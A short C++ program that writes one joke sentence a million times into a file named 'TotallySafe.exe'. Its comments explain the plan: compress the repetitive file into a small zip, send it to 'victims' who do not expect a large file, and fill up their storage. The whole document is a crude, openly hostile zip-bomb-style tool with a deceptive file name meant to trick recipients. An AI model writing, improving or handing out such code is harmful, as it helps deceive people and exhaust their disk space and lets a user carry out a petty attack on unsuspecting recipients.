#include <iostream>
#include <fstream>

using namespace std;

int main() {
  ofstream bomb("TotallySafe.exe");

  for (int i = 0; i < 1000000; i++) { //Change the number here to change the size.
  bomb << "This is a totally normal file bro trust me!";
  }
  bomb.close();
}

// This program creates a very large file.
// But the size of the file will become very small after compressed into .zip file
// due to its repeating content.

// It will let victims that don't expect a large file fell for it and flood there storage space.
// But becareful how many times you loop it, or else your own computer will crash too!
